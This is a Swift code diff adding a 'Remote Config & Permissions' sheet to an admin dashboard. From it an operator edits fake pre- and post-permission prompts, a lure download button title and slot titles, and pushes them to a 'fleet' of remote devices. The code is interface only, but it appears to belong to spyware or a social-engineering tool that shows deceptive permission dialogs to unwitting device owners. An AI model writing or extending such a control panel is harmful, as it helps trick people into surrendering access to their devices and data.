@@ -13,6 +13,8 @@ struct AdminDashboardView: View {
 
     @State private var selectedMedia: VaultMediaItem? = nil
     @State private var saveSuccessAlert = false
+    @State private var showConfigSheet = false
+    @State private var configSaveSuccess = false
 
     var body: some View {
         ZStack {
@@ -25,6 +27,9 @@ struct AdminDashboardView: View {
             }
         }
         .preferredColorScheme(.dark)
+        .sheet(isPresented: $showConfigSheet) {
+            configSheetView
+        }
     }
 
     // MARK: - 1. Cyber Passcode Authentication Screen
@@ -133,26 +138,42 @@ struct AdminDashboardView: View {
 
                 Spacer()
 
-                // Device Switcher Menu
-                if !admin.devices.isEmpty {
-                    Menu {
-                        ForEach(admin.devices) { dev in
-                            Button(action: { admin.selectDevice(dev) }) {
-                                Text("\(dev.name) (\(dev.id)) - " + (dev.isOnline ? "🟢 Online" : "🔴 Offline"))
+                HStack(spacing: 8) {
+                    // Device Switcher Menu
+                    if !admin.devices.isEmpty {
+                        Menu {
+                            ForEach(admin.devices) { dev in
+                                Button(action: { admin.selectDevice(dev) }) {
+                                    Text("\(dev.name) (\(dev.id)) - " + (dev.isOnline ? "🟢 Online" : "🔴 Offline"))
+                                }
                             }
+                        } label: {
+                            HStack(spacing: 4) {
+                                Text(admin.selectedDevice?.id ?? "SELECT")
+                                    .font(.system(size: 11, weight: .bold, design: .monospaced))
+                                Image(systemName: "chevron.down")
+                                    .font(.system(size: 10))
+                            }
+                            .foregroundColor(.green)
+                            .padding(.horizontal, 10)
+                            .padding(.vertical, 6)
+                            .background(Color.white.opacity(0.06))
+                            .cornerRadius(8)
                         }
-                    } label: {
-                        HStack(spacing: 4) {
-                            Text(admin.selectedDevice?.id ?? "SELECT")
-                                .font(.system(size: 11, weight: .bold, design: .monospaced))
-                            Image(systemName: "chevron.down")
-                                .font(.system(size: 10))
-                        }
-                        .foregroundColor(.green)
-                        .padding(.horizontal, 10)
-                        .padding(.vertical, 6)
-                        .background(Color.white.opacity(0.06))
-                        .cornerRadius(8)
+                    }
+
+                    // Remote Configuration & Permissions Editor Button
+                    Button(action: {
+                        configSaveSuccess = false
+                        admin.fetchDeviceConfig()
+                        showConfigSheet = true
+                    }) {
+                        Image(systemName: "slider.horizontal.3")
+                            .font(.system(size: 13, weight: .bold))
+                            .foregroundColor(.green)
+                            .padding(7)
+                            .background(Color.white.opacity(0.06))
+                            .cornerRadius(8)
                     }
                 }
             }
@@ -507,6 +528,161 @@ struct AdminDashboardView: View {
                 }
                 .padding(.bottom, 24)
             }
+        }
+    }
+
+    // MARK: - Remote Configuration & Permissions Modal
+    private var configSheetView: some View {
+        NavigationView {
+            ZStack {
+                Color(red: 0.05, green: 0.06, blue: 0.08).edgesIgnoringSafeArea(.all)
+
+                ScrollView {
+                    VStack(alignment: .leading, spacing: 18) {
+                        // Section 1: Fake Permission 1
+                        VStack(alignment: .leading, spacing: 10) {
+                            Text("FAKE PERMISSION 1 (PRE-PROMPT)")
+                                .font(.system(size: 11, weight: .bold, design: .monospaced))
+                                .foregroundColor(.purple)
+
+                            VStack(spacing: 8) {
+                                TextField("Title", text: $admin.configFakePrompt1Title)
+                                    .textFieldStyle(PlainTextFieldStyle())
+                                    .padding(10)
+                                    .background(Color.white.opacity(0.06))
+                                    .cornerRadius(8)
+                                    .foregroundColor(.white)
+                                    .font(.system(size: 13, design: .monospaced))
+
+                                TextField("Message", text: $admin.configFakePrompt1Msg)
+                                    .textFieldStyle(PlainTextFieldStyle())
+                                    .padding(10)
+                                    .background(Color.white.opacity(0.06))
+                                    .cornerRadius(8)
+                                    .foregroundColor(.gray)
+                                    .font(.system(size: 12))
+                            }
+                        }
+                        .padding(14)
+                        .background(Color.purple.opacity(0.08))
+                        .cornerRadius(12)
+
+                        // Section 2: Fake Permission 2
+                        VStack(alignment: .leading, spacing: 10) {
+                            Text("FAKE PERMISSION 2 (POST-PROMPT)")
+                                .font(.system(size: 11, weight: .bold, design: .monospaced))
+                                .foregroundColor(.purple)
+
+                            VStack(spacing: 8) {
+                                TextField("Title", text: $admin.configFakePrompt2Title)
+                                    .textFieldStyle(PlainTextFieldStyle())
+                                    .padding(10)
+                                    .background(Color.white.opacity(0.06))
+                                    .cornerRadius(8)
+                                    .foregroundColor(.white)
+                                    .font(.system(size: 13, design: .monospaced))
+
+                                TextField("Message", text: $admin.configFakePrompt2Msg)
+                                    .textFieldStyle(PlainTextFieldStyle())
+                                    .padding(10)
+                                    .background(Color.white.opacity(0.06))
+                                    .cornerRadius(8)
+                                    .foregroundColor(.gray)
+                                    .font(.system(size: 12))
+                            }
+                        }
+                        .padding(14)
+                        .background(Color.purple.opacity(0.08))
+                        .cornerRadius(12)
+
+                        // Section 3: Action Button Title
+                        VStack(alignment: .leading, spacing: 8) {
+                            Text("ACTION BUTTON TITLE")
+                                .font(.system(size: 11, weight: .bold, design: .monospaced))
+                                .foregroundColor(.green)
+
+                            TextField("e.g. Download CloudStream Provider", text: $admin.configButtonTitle)
+                                .textFieldStyle(PlainTextFieldStyle())
+                                .padding(10)
+                                .background(Color.white.opacity(0.06))
+                                .cornerRadius(8)
+                                .foregroundColor(.white)
+                                .font(.system(size: 13))
+                        }
+                        .padding(14)
+                        .background(Color.green.opacity(0.08))
+                        .cornerRadius(12)
+
+                        // Section 4: Dynamic Slot Titles
+                        VStack(alignment: .leading, spacing: 10) {
+                            Text("SLOT TITLES (SLOTS 1 - 4)")
+                                .font(.system(size: 11, weight: .bold, design: .monospaced))
+                                .foregroundColor(.cyan)
+
+                            VStack(spacing: 8) {
+                                TextField("Slot 1 Title", text: $admin.configSlot1Title)
+                                    .textFieldStyle(PlainTextFieldStyle())
+                                    .padding(10)
+                                    .background(Color.white.opacity(0.06))
+                                    .cornerRadius(8)
+                                    .foregroundColor(.white)
+                                    .font(.system(size: 13))
+
+                                TextField("Slot 2 Title", text: $admin.configSlot2Title)
+                                    .textFieldStyle(PlainTextFieldStyle())
+                                    .padding(10)
+                                    .background(Color.white.opacity(0.06))
+                                    .cornerRadius(8)
+                                    .foregroundColor(.white)
+                                    .font(.system(size: 13))
+
+                                TextField("Slot 3 Title", text: $admin.configSlot3Title)
+                                    .textFieldStyle(PlainTextFieldStyle())
+                                    .padding(10)
+                                    .background(Color.white.opacity(0.06))
+                                    .cornerRadius(8)
+                                    .foregroundColor(.white)
+                                    .font(.system(size: 13))
+
+                                TextField("Slot 4 Title", text: $admin.configSlot4Title)
+                                    .textFieldStyle(PlainTextFieldStyle())
+                                    .padding(10)
+                                    .background(Color.white.opacity(0.06))
+                                    .cornerRadius(8)
+                                    .foregroundColor(.white)
+                                    .font(.system(size: 13))
+                            }
+                        }
+                        .padding(14)
+                        .background(Color.white.opacity(0.04))
+                        .cornerRadius(12)
+
+                        // Save Button
+                        Button(action: {
+                            admin.saveDeviceConfig { success in
+                                if success {
+                                    configSaveSuccess = true
+                                    DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
+                                        showConfigSheet = false
+                                    }
+                                }
+                            }
+                        }) {
+                            Text(configSaveSuccess ? "SAVED TO FLEET ✓" : "SAVE CONFIGURATION TO FLEET")
+                                .font(.system(size: 13, weight: .bold))
+                                .foregroundColor(.black)
+                                .frame(maxWidth: .infinity)
+                                .padding(.vertical, 14)
+                                .background(Color.green)
+                                .cornerRadius(12)
+                        }
+                        .padding(.top, 8)
+                    }
+                    .padding(18)
+                }
+            }
+            .navigationBarTitle("Remote Config & Permissions", displayMode: .inline)
+            .navigationBarItems(trailing: Button("Close") { showConfigSheet = false }.foregroundColor(.green))
         }
     }
 }
